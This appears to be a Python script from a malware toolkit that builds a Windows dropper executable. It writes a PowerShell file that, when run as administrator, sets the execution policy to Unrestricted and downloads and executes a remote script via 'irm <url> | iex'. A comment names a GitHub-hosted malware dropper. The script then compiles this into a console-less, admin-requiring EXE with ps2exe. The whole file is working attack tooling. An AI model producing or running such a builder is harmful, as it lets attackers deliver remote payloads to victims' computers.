import sys, os
import subprocess
import json

def create_ps1_file(encoded_dropper_url):
    file_contents = '''Add-Type -AssemblyName System.Windows.Forms
$isadmin = New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())
if ($isadmin.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Set-ExecutionPolicy Unrestricted
    $cmd = "irm '''+ encoded_dropper_url +''' | iex"
    Invoke-Expression $cmd
} else {
    [System.Windows.Forms.MessageBox]::Show("You need to run this program in admin mode. Thanks", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
}
    '''
    #https://raw.githubusercontent.com/RaviNayyar/ps_malware_dropper/main/dropper/enc_drop.ps1
    f = open("init_file.ps1", "w")
    f.write(file_contents)
    f.close()



def cmdlet_exists(cmdlet_name):
    cmd = ['powershell.exe', f'-Command', f'Get-Command {cmdlet_name}']
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError:
        return False
    return True


def setup():
    # Test if the Get-Service cmdlet exists
    if cmdlet_exists('Get-Service'):
        print('Get-Service cmdlet exists')
    else:
        print('Get-Service cmdlet does not exist')

    # Test if the nonexistent cmdlet exists
    if cmdlet_exists('Invoke-PS2EXE '):
        print('Invoke-PS2EXE  cmdlet exists')
        return True
    else:
        print('Installing Invoke-PS2EXE cmdlet')
        os.system("powershell.exe Install-Module ps2exe")
        if cmdlet_exists('Invoke-PS2EXE '):
            print('Invoke-PS2EXE  cmdlet exists')
            return True
    
    return False


def parse_config_file(config_path):
    f = open(config_path)
    data = json.load(f)
    ac = data["attack chain"]
    encoded_dropper_url = ac["init_exe"]["encoded_dropper_url"]
    init_exe_filename = ac["init_exe"]["init_exe_filename"]
    return (encoded_dropper_url, init_exe_filename)


def usage_details():
    print("Usage Example 1: python3 create_init_exe.py <attack chain config path>\n")


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("CMD Line Args Error")
        usage_details()
        sys.exit()
    
    if not os.path.exists(sys.argv[1]):
        print("Attack Chain Config File Path Not Found")
        usage_details()
    
    (encoded_dropper_url, init_exe_filename) = parse_config_file(sys.argv[1])

    create_ps1_file(encoded_dropper_url)

    if not setup():
        print("Unable to create EXE from ps1 file")
        sys.exit()
    
    if init_exe_filename[:-4] != ".exe":
        init_exe_filename += ".exe"

    os.system(f"powershell.exe  Invoke-PS2EXE -inputFile init_file.ps1 -outputFile {init_exe_filename} -requireAdmin -noConsole")
    